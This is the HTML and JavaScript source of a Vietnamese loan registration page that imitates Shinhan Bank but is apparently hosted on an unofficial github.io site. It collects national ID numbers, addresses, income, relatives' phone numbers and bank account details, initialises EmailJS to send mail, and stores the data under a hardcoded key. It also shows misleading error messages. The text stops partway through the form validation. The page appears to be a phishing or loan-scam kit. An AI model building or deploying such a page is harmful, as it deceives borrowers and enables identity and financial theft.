
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shinhan Bank - Nhập Thông Tin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #003087;
            --secondary-color: #f8f9fa;
            --accent-color: #ff6200;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--secondary-color);
            overflow-x: hidden;
        }
        .navbar {
            background-color: var(--primary-color);
        }
        .navbar-brand img {
            height: 50px;
            max-width: 100%;
            object-fit: contain;
        }
        .navbar-nav {
            display: flex;
            flex-wrap: nowrap;
            overflow-x: auto;
            white-space: nowrap;
            -webkit-overflow-scrolling: touch;
        }
        .navbar-nav .nav-link {
            color: white !important;
            transition: color 0.3s;
            padding: 8px 10px;
            font-size: 0.9rem;
            margin: 0 5px;
        }
        .navbar-nav .nav-link:hover {
            color: var(--accent-color) !important;
        }
        .step-indicator {
            display: flex;
            justify-content: center;
            margin: 20px 0;
            position: relative;
            flex-wrap: nowrap;
            overflow-x: auto;
            white-space: nowrap;
            -webkit-overflow-scrolling: touch;
        }
        .step {
            padding: 12px 24px;
            margin: 0 5px;
            border-radius: 50px;
            background-color: #d3d3d3;
            color: #333;
            font-weight: 700;
            font-size: 14px;
            position: relative;
            z-index: 1;
            transition: all 0.3s ease;
        }
        .step.active {
            background-color: var(--primary-color);
            color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.8);
            transform: scale(1.1);
        }
        .step::before {
            content: '\f058';
            font-family: 'Font Awesome 6 Free';
            font-weight: 900;
            margin-right: 5px;
        }
        .step-indicator::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 3px;
            background-color: #d3d3d3;
            z-index: 0;
        }
        .progress-percentage {
            text-align: center;
            font-size: 1rem;
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        .form-section {
            background: white;
            padding: 20px;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            margin-bottom: 15px;
        }
        .form-section h3 {
            color: var(--primary-color);
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 8px;
            margin-bottom: 15px;
            font-size: 1.2rem;
        }
        .form-label {
            color: var(--primary-color);
            font-weight: 500;
            margin-bottom: 8px;
        }
        .form-control, .form-select {
            font-size: 14px;
            padding: 8px;
            margin-bottom: 15px;
        }
        .form-control:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 5px rgba(255, 98, 0, 0.5);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 8px 15px;
            font-size: 14px;
            transition: background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: var(--accent-color);
            border-color: var(--accent-color);
        }
        .error {
            color: #dc3545;
            font-size: 0.8rem;
            margin-top: 3px;
        }
        .success-message {
            color: #28a745;
            font-size: 0.8rem;
            margin-top: 5px;
            display: none;
        }
        .footer-links a {
            margin: 0 8px;
            color: var(--primary-color);
            text-decoration: none;
            font-size: 0.9rem;
        }
        .footer-links a:hover {
            color: var(--accent-color);
        }
        .calculation-table {
            margin-top: 15px;
            font-size: 0.9rem;
        }
        .spinner {
            display: none;
            margin-left: 8px;
        }
        .accordion-button {
            font-size: 0.9rem;
        }
        .tooltip-icon {
            color: var(--primary-color);
            margin-left: 5px;
            cursor: pointer;
        }
        .fixed-bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            padding: 10px;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-around;
            z-index: 1000;
        }
        .fixed-bottom-bar .btn {
            flex: 1;
            margin: 0 5px;
            font-size: 14px;
            padding: 10px;
        }
        @media (max-width: 768px) {
            .navbar-brand img {
                height: 40px;
                max-width: 100%;
                object-fit: contain;
            }
            .navbar-nav .nav-link {
                font-size: 14px;
                padding: 10px;
            }
            .step-indicator {
                flex-direction: row;
                flex-wrap: nowrap;
                overflow-x: auto;
                padding-bottom: 10px;
            }
            .step {
                padding: 8px 15px;
                margin: 0 8px;
                font-size: 14px;
            }
            .step-indicator::before {
                left: 10%;
                right: 10%;
            }
            .progress-percentage {
                font-size: 0.9rem;
            }
            .form-section {
                padding: 15px;
            }
            .accordion-body {
                padding: 12px;
            }
            .calculation-table {
                display: block;
                font-size: 14px;
            }
            .calculation-table thead {
                display: none;
            }
            .calculation-table tbody tr {
                display: flex;
                flex-wrap: wrap;
                padding: 10px 0;
                border-bottom: 1px solid #e9ecef;
            }
            .calculation-table tbody td {
                flex: 1 1 50%;
                padding: 5px;
                text-align: left;
            }
            .calculation-table tbody td:before {
                content: attr(data-label);
                font-weight: 500;
                color: var(--primary-color);
                display: block;
            }
            .calculation-table tbody td:nth-child(1):before { content: "Tháng: "; }
            .calculation-table tbody td:nth-child(2):before { content: "Gốc: "; }
            .calculation-table tbody td:nth-child(3):before { content: "Lãi: "; }
            .calculation-table tbody td:nth-child(4):before { content: "Tổng: "; }
            .calculation-table tbody td:nth-child(5):before { content: "Dư nợ: "; }
            .container {
                padding-left: 12px;
                padding-right: 12px;
            }
            .btn-primary {
                width: 100%;
                margin-bottom: 12px;
                font-size: 14px;
            }
            .form-control, .form-select {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <header>
        <nav class="navbar navbar-expand-lg">
            <div class="container">
                <a class="navbar-brand" href="#"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo'" alt="Shinhan Bank Logo"></a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item"><a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>

    <main class="container mt-3">
        <div class="step-indicator">
            <div class="step active">1. Nhập thông tin</div>
            <div class="step">2. Xác thực và xử lý</div>
            <div class="step">3. Hoàn thành</div>
        </div>

        <div id="registrationContent">
            <h2 class="text-center mb-3">THÔNG TIN ĐĂNG KÝ KHOẢN VAY</h2>

            <form id="registrationForm" onsubmit="handleSubmit(event)">
                <input type="hidden" id="csrf" name="_csrf" value="mock-csrf-token">

                <div class="accordion" id="formAccordion">
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#personalInfo" aria-expanded="true" aria-controls="personalInfo">
                                THÔNG TIN CÁ NHÂN
                            </button>
                        </h2>
                        <div id="personalInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="fullName" class="form-label">Họ và Tên * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập đầy đủ họ và tên như trên CCCD"></i></label>
                                        <input type="text" class="form-control" id="fullName" name="fullName" autocomplete="name" required>
                                        <p id="fullNameError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="dob" class="form-label">Ngày sinh *</label>
                                        <input type="text" class="form-control" id="dob" name="dob" autocomplete="bday" placeholder="dd/mm/yyyy" required>
                                        <p id="dobError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="gender" class="form-label">Giới tính *</label>
                                        <select class="form-select" id="gender" name="gender" autocomplete="sex" required>
                                            <option value="">Chọn giới tính</option>
                                            <option value="Nam">Nam</option>
                                            <option value="Nữ">Nữ</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="genderError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="contactAddress" class="form-label">Địa chỉ thường trú *</label>
                                        <input type="text" class="form-control" id="contactAddress" name="contactAddress" autocomplete="street-address" required>
                                        <p id="contactAddressError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="hometown" class="form-label">Quê quán *</label>
                                        <input type="text" class="form-control" id="hometown" name="hometown" required>
                                        <p id="hometownError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="nationality" class="form-label">Quốc tịch *</label>
                                        <input type="text" class="form-control" id="nationality" name="nationality" value="Việt Nam" required>
                                        <p id="nationalityError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="cccd" class="form-label">Số định danh cá nhân (CCCD/CMND) *</label>
                                        <input type="text" class="form-control" id="cccd" name="cccd" autocomplete="off" required maxlength="12">
                                        <p id="cccdError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="idIssueDate" class="form-label">Ngày cấp *</label>
                                        <input type="date" class="form-control" id="idIssueDate" name="idIssueDate" required>
                                        <p id="idIssueDateError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="issuePlace" class="form-label">Nơi cấp *</label>
                                        <select class="form-select" id="issuePlace" name="issuePlace" required>
                                            <option value="">Chọn nơi cấp</option>
                                            <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                                            <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                                        </select>
                                        <p id="issuePlaceError" class="error"></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#registrationInfo" aria-expanded="true" aria-controls="registrationInfo">
                                THÔNG TIN ĐĂNG KÝ
                            </button>
                        </h2>
                        <div id="registrationInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="phone" class="form-label">Số điện thoại * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                                        <input type="tel" class="form-control" id="phone" name="phone" autocomplete="tel" required maxlength="13">
                                        <p id="phoneError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="email" class="form-label">E-mail *</label>
                                        <input type="email" class="form-control" id="email" name="email" autocomplete="email" required>
                                        <p id="emailError" class="error"></p>
                                        <small class="form-text text-muted">Bạn sẽ nhận thông tin hồ sơ đăng ký về email này.</small>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="loanType" class="form-label">Hình thức vay *</label>
                                        <select class="form-select" id="loanType" name="loanType" required>
                                            <option value="">Chọn Hình thức vay</option>
                                            <option value="Vay tín chấp">Vay tín chấp</option>
                                            <option value="Vay thế chấp">Vay thế chấp</option>
                                            <option value="Vay thấu chi">Vay thấu chi</option>
                                            <option value="Vay trả góp">Vay trả góp</option>
                                        </select>
                                        <p id="loanTypeError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="loanTerm" class="form-label">Thời hạn vay yêu cầu * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
                                        <select class="form-select" id="loanTerm" name="loanTerm" required>
                                            <option value="">Chọn số tháng</option>
                                            <option value="6">6 tháng</option>
                                            <option value="12">12 tháng</option>
                                            <option value="18">18 tháng</option>
                                            <option value="24">24 tháng</option>
                                            <option value="36">36 tháng</option>
                                            <option value="48">48 tháng</option>
                                            <option value="60">60 tháng</option>
                                        </select>
                                        <p id="loanTermError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="loanAmount" class="form-label">Số tiền vay yêu cầu (VND) *</label>
                                        <select class="form-select" id="loanAmount" name="loanAmount" required>
                                            <option value="">Chọn số tiền</option>
                                            <option value="10000000">10,000,000</option>
                                            <option value="20000000">20,000,000</option>
                                            <option value="30000000">30,000,000</option>
                                            <option value="40000000">40,000,000</option>
                                            <option value="50000000">50,000,000</option>
                                            <option value="60000000">60,000,000</option>
                                            <option value="70000000">70,000,000</option>
                                            <option value="80000000">80,000,000</option>
                                            <option value="90000000">90,000,000</option>
                                            <option value="100000000">100,000,000</option>
                                            <option value="150000000">150,000,000</option>
                                            <option value="200000000">200,000,000</option>
                                            <option value="300000000">300,000,000</option>
                                            <option value="400000000">400,000,000</option>
                                            <option value="500000000">500,000,000</option>
                                            <option value="other">Khác</option>
                                        </select>
                                        <p id="loanAmountError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="disbursementDate" class="form-label">Dự kiến giải ngân ngày *</label>
                                        <input type="date" class="form-control" id="disbursementDate" name="disbursementDate" autocomplete="off" required>
                                        <p id="disbursementDateError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="interestRate" class="form-label">Lãi suất (%/năm) * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Lãi suất được tự động chọn theo gói vay"></i></label>
                                        <input type="number" class="form-control" id="interestRate" name="interestRate" step="0.01" required readonly>
                                        <p id="interestRateError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="monthlyIncome" class="form-label">Thu nhập hàng tháng (VND) *</label>
                                        <input type="text" class="form-control" id="monthlyIncome" name="monthlyIncome" required>
                                        <p id="monthlyIncomeError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="occupation" class="form-label">Nghề nghiệp *</label>
                                        <select class="form-select" id="occupation" name="occupation" required>
                                            <option value="">Chọn nghề nghiệp</option>
                                            <option value="Kỹ sư">Kỹ sư</option>
                                            <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
                                            <option value="Giáo viên">Giáo viên</option>
                                            <option value="Bác sĩ">Bác sĩ</option>
                                            <option value="Kinh doanh">Kinh doanh</option>
                                            <option value="Nội trợ">Nội trợ</option>
                                            <option value="Hưu trí">Hưu trí</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="occupationError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="loanPurpose" class="form-label">Mục đích vay *</label>
                                        <select class="form-select" id="loanPurpose" name="loanPurpose" required>
                                            <option value="">Chọn mục đích vay</option>
                                            <option value="Mua nhà">Mua nhà</option>
                                            <option value="Mua xe">Mua xe</option>
                                            <option value="Kinh doanh">Kinh doanh</option>
                                            <option value="Học tập">Học tập</option>
                                            <option value="Du lịch">Du lịch</option>
                                            <option value="Tiêu dùng">Tiêu dùng</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="loanPurposeError" class="error"></p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="relativePhone" class="form-label">Số điện thoại người thân * <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                                        <input type="tel" class="form-control" id="relativePhone" name="relativePhone" autocomplete="tel" required maxlength="13">
                                        <p id="relativePhoneError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="relationship" class="form-label">Quan hệ *</label>
                                        <select class="form-select" id="relationship" name="relationship" required>
                                            <option value="">Chọn quan hệ</option>
                                            <option value="Bạn bè">Bạn bè</option>
                                            <option value="Anh">Anh</option>
                                            <option value="Chị">Chị</option>
                                            <option value="Em">Em</option>
                                            <option value="Đồng nghiệp">Đồng nghiệp</option>
                                            <option value="Vợ/Chồng">Vợ/Chồng</option>
                                            <option value="Bố">Bố</option>
                                            <option value="Mẹ">Mẹ</option>
                                            <option value="Khác">Khác</option>
                                        </select>
                                        <p id="relationshipError" class="error"></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#accountInfo" aria-expanded="true" aria-controls="accountInfo">
                                TÀI KHOẢN GIẢI NGÂN
                            </button>
                        </h2>
                        <div id="accountInfo" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="accountName" class="form-label">Tên chủ tài khoản *</label>
                                        <input type="text" class="form-control" id="accountName" name="accountName" autocomplete="name" required>
                                        <p id="accountNameError" class="error"></p>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="accountNumber" class="form-label">Số tài khoản *</label>
                                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" autocomplete="off" required maxlength="16">
                                        <p id="accountNumberError" class="error"></p>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label for="bankName" class="form-label">Tên ngân hàng *</label>
                                    <select class="form-select" id="bankName" name="bankName" required>
                                        <option value="">Chọn ngân hàng</option>
                                        <option value="Shinhan Bank">Shinhan Bank</option>
                                        <option value="Vietcombank">Vietcombank</option>
                                        <option value="Techcombank">Techcombank</option>
                                        <option value="BIDV">BIDV</option>
                                        <option value="Agribank">Agribank</option>
                                        <option value="MB Bank">MB Bank</option>
                                        <option value="VPBank">VPBank</option>
                                        <option value="Sacombank">Sacombank</option>
                                        <option value="ACB">ACB</option>
                                        <option value="VietinBank">VietinBank</option>
                                        <option value="TPBank">TPBank</option>
                                        <option value="HDBank">HDBank</option>
                                        <option value="MSB">MSB</option>
                                        <option value="VIB">VIB</option>
                                        <option value="SeABank">SeABank</option>
                                        <option value="OCB">OCB</option>
                                        <option value="SCB">SCB</option>
                                        <option value="Nam A Bank">Nam A Bank</option>
                                        <option value="SHB">SHB</option>
                                        <option value="PVcomBank">PVcomBank</option>
                                        <option value="BAOVIET Bank">BAOVIET Bank</option>
                                        <option value="LienVietPostBank">LienVietPostBank</option>
                                        <option value="SAIGONBANK">SAIGONBANK</option>
                                    </select>
                                    <p id="bankNameError" class="error"></p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion-item">
                        <h2 class="accordion-header">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#calculationResult" aria-expanded="true" aria-controls="calculationResult">
                                KẾT QUẢ TÍNH TOÁN
                            </button>
                        </h2>
                        <div id="calculationResult" class="accordion-collapse collapse show" data-bs-parent="#formAccordion">
                            <div class="accordion-body">
                                <div id="calculationSummary" class="mb-3">
                                    <p>Số tiền vay: <span id="calcLoanAmount">0</span> VND</p>
                                    <p>Thanh toán hàng tháng: <span id="calcMonthlyPayment">0</span> VND</p>
                                    <p>Tổng lãi phải trả: <span id="calcTotalInterest">0</span> VND</p>
                                    <p>Tổng gốc + lãi: <span id="calcTotalAmount">0</span> VND</p>
                                </div>
                                <p id="calculationSuccess" class="success-message">Tính toán hoàn tất!</p>
                                <table class="table table-bordered calculation-table">
                                    <thead>
                                        <tr>
                                            <th data-label="Tháng">Tháng</th>
                                            <th data-label="Gốc">Gốc (VND)</th>
                                            <th data-label="Lãi">Lãi (VND)</th>
                                            <th data-label="Tổng">Tổng (VND)</th>
                                            <th data-label="Dư nợ">Dư nợ (VND)</th>
                                        </tr>
                                    </thead>
                                    <tbody id="calculationTable"></tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="form-check mb-3">
                    <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                    <label class="form-check-label" for="privacyConsent">
                        Tôi đồng ý với <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
                    </label>
                    <p id="privacyConsentError" class="error"></p>
                </div>

                <div class="fixed-bottom-bar">
                    <button type="button" class="btn btn-primary" onclick="calculateLoan()">
                        TÍNH TOÁN
                        <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                    </button>
                    <button type="submit" class="btn btn-primary">
                        ĐĂNG KÝ
                        <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                    </button>
                </div>
            </form>
        </div>
    </main>

    <footer class="bg-light py-3 mt-4">
        <div class="container text-center">
            <div class="footer-links">
                <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
                <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
            </div>
            <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        try {
            emailjs.init("OrBsI926QI2_xBh1f");
            console.log('EmailJS initialized successfully');
        } catch (error) {
            console.error('EmailJS initialization failed:', error);
            alert('Lỗi khởi tạo EmailJS. Vui lòng thử lại sau.');
        }

        let userData = {};
        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];

        // Initialize tooltips, input masks, and default disbursement date
        $(document).ready(function(){
            $('[data-bs-toggle="tooltip"]').tooltip();
            $('#phone').mask('+84999999999', {
                translation: {
                    '9': { pattern: /[0-9]/, optional: true }
                },
                placeholder: "+84 ___ ___ ___"
            });
            $('#relativePhone').mask('+84999999999', {
                translation: {
                    '9': { pattern: /[0-9]/, optional: true }
                },
                placeholder: "+84 ___ ___ ___"
            });
            $('#cccd').mask('000000000000');
            $('#accountNumber').mask('0000000000000000');
            $('#dob').mask('00/00/0000');
            $('#monthlyIncome').mask('000,000,000,000', {reverse: true});
            const today = new Date().toISOString().split('T')[0];
            document.getElementById('disbursementDate').value = today;
            updateInterestRate();
        });

        // Auto-select interest rate based on loan type
        const updateInterestRate = () => {
            const loanType = document.getElementById('loanType').value || userData.loanType || '';
            const interestRate = document.getElementById('interestRate');
            const rates = {
                'Vay tín chấp': 7.8,
                'Vay thế chấp': 6.2,
                'Vay thấu chi': 8.5,
                'Vay trả góp': 7.2
            };
            const rate = rates[loanType] || 7.0;
            interestRate.value = rate.toFixed(2);
            console.log(`Interest rate set to ${rate}% for ${loanType || 'default'}`);
            interestRate.dispatchEvent(new Event('change'));
        };

        document.getElementById('loanType').addEventListener('change', updateInterestRate);

        document.getElementById('interestRate').addEventListener('change', function() {
            this.value = parseFloat(this.value).toFixed(2);
        });

        // Load user data on page load
        window.onload = function() {
            loadUserData();
            updateInterestRate();
        };

        function getCurrentDate() {
            const today = new Date();
            const year = today.getFullYear();
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const day = String(today.getDate()).padStart(2, '0');
            return `${year}-${month}-${day}`;
        }

        function checkLocalStorageQuota() {
            try {
                const testKey = '__test__';
                localStorage.setItem(testKey, 'test');
                localStorage.removeItem(testKey);
                return true;
            } catch (e) {
                console.error('LocalStorage quota exceeded:', e);
                alert('Thông tin đăng ký không chính xác. Vui lòng thử lại sau.');
                return false;
            }
        }

        function saveToLocalStorage() {
            if (!checkLocalStorageQuota()) return false;
            try {
                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                localStorage.setItem('userData', encryptedData);
                console.log('Saved userData to localStorage:', userData);
                return true;
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
                alert('Thông tin của quý khách không trùng khớp tại hệ thống. Vui lòng thử lại hoặc liên hệ hỗ trợ.');
                return false;
            }
        }

        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                    console.log('Loaded userData from localStorage:', userData);
                    document.getElementById('fullName').value = userData.fullName || '';
                    document.getElementById('dob').value = userData.dob || '';
                    document.getElementById('gender').value = userData.gender || '';
                    document.getElementById('contactAddress').value = userData.contactAddress || '';
                    document.getElementById('hometown').value = userData.hometown || '';
                    document.getElementById('nationality').value = userData.nationality || 'Việt Nam';
                    document.getElementById('cccd').value = userData.cccd || '';
                    document.getElementById('idIssueDate').value = userData.idIssueDate || '';
                    document.getElementById('issuePlace').value = userData.issuePlace || '';
                    document.getElementById('phone').value = userData.phone || '';
                    document.getElementById('email').value = userData.email || '';
                    document.getElementById('loanType').value = userData.loanType || '';
                    document.getElementById('loanTerm').value = userData.loanTerm || '';
                    document.getElementById('loanAmount').value = userData.loanAmount || '';
                    document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
                    document.getElementById('interestRate').value = userData.interestRate || '7.00';
                    document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
                    document.getElementById('occupation').value = userData.occupation || '';
                    document.getElementById('loanPurpose').value = userData.loanPurpose || '';
                    document.getElementById('relativePhone').value = userData.relativePhone || '';
                    document.getElementById('relationship').value = userData.relationship || '';
                    document.getElementById('accountName').value = userData.accountName || '';
                    document.getElementById('accountNumber').value = userData.accountNumber || '';
                    document.getElementById('bankName').value = userData.bankName || '';
                    updateInterestRate();
                } else {
                    updateInterestRate();
                }
            } catch (error) {
                console.error('Error loading userData from localStorage:', error);
                updateInterestRate();
            }
        }

        function validateForm() {
            let isValid = true;
            let errorMessages = [];
            const fields = [
                { id: 'fullName', errorId: 'fullNameError', validate: value => value.trim().length > 2, message: 'Họ và tên phải trên 2 ký tự.' },
                { id: 'dob', errorId: 'dobError', validate: value => {
                    const regex = /^\d{2}\/\d{2}\/\d{4}$/;
                    if (!regex.test(value)) return false;
                    const [day, month, year] = value.split('/').map(Number);
                    const date = new Date(year, month - 1, day);
                    const minDate = new Date('1900-01-01');
                    const today = new Date();
                    return date && !isNaN(date) && date <= today && date >= minDate && date.getDate() === day && date.getMonth() + 1 === month && date.getFullYear() === year;
                }, message: 'Ngày sinh phải hợp lệ (dd/mm/yyyy, từ 1900, không phải tương lai).' },
                { id: 'gender', errorId: 'genderError', validate: value => value !== '', message: 'Vui lòng chọn giới tính.' },
                { id: 'contactAddress', errorId: 'contactAddressError', validate: value => value.trim().length > 5, message: 'Địa chỉ thường trú phải chi tiết (trên 5 ký tự).' },
                { id: 'hometown', errorId: 'hometownError', validate: value => value.trim().length > 5, message: 'Quê quán phải chi tiết (trên 5 ký tự).' },
                { id: 'nationality', errorId: 'nationalityError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập quốc tịch.' },
                { id: 'cccd', errorId: 'cccdError', validate: value => /^\d{12}$/.test(value), message: 'CCCD phải đúng 12 chữ số.' },
                { id: 'idIssueDate', errorId: 'idIssueDateError', validate: value => value && new Date(value) <= new Date(), message: 'Ngày cấp phải hợp lệ và không phải tương lai.' },
                { id: 'issuePlace', errorId: 'issuePlaceError', validate: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
                { id: 'phone', errorId: 'phoneError', validate: value => {
                    let normalized = value.replace(/\s/g, '').replace(/^\+84/, '0');
                    return /^\d{10}$/.test(normalized);
                }, message: 'Số điện thoại phải đúng 10 chữ số (bắt đầu bằng +84 hoặc 0).' },
                { id: 'email', errorId: 'emailError', validate: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ (ví dụ: example@domain.com).' },
                { id: 'loanType', errorId: 'loanTypeError', validate: value => value !== '', message: 'Vui lòng chọn hình thức vay.' },
                { id: 'loanTerm', errorId: 'loanTermError', validate: value => value !== '', message: 'Vui lòng chọn thời hạn vay.' },
                { id: 'loanAmount', errorId: 'loanAmountError', validate: value => value !== '' && value !== 'other', message: 'Vui lòng chọn số tiền vay hợp lệ.' },
                { id: 'disbursementDate', errorId: 'disbursementDateError', validate: value => value && new Date(value) >= new Date().setHours(0, 0, 0, 0), message: 'Ngày giải ngân phải từ hôm nay trở đi.' },
                { id: 'interestRate', errorId: 'interestRateError', validate: value => value >= 5 && value <= 10, message: 'Lãi suất phải từ 5% đến 10%.' },
                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: value => {
